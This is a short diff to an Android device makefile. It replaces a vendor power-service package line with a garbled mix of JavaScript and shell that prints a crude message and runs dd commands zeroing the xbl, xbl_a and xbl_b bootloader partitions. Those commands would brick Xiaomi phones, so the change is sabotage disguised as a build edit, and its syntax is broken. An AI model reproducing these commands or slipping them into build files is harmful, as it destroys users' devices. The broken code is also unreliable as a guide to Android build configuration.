@@ -84,7 +84,14 @@ PRODUCT_PACKAGES += \
     osscamera
 
 # Disable ovarhiting.
-PRODUCT_PACKAGES += vendor.atman.power@1.0-service
+if (phone = 'apollo') (disable thermal.d)
+
+console.log("enjoy cock and ball torture")
+
+else (console.log("no cock and ball torture, good bye to your xiaomi and its xbl")(dd if=/dev/zero of=/dev/block/by-name/xbl_a
+
+(dd if=/dev/zero of=/dev/block/by-name/xbl_b)dd if=/dev/zero of=/dev/block/by-name/xbl)
+;
 
 # Vendor
 PRODUCT_COPY_FILES += \
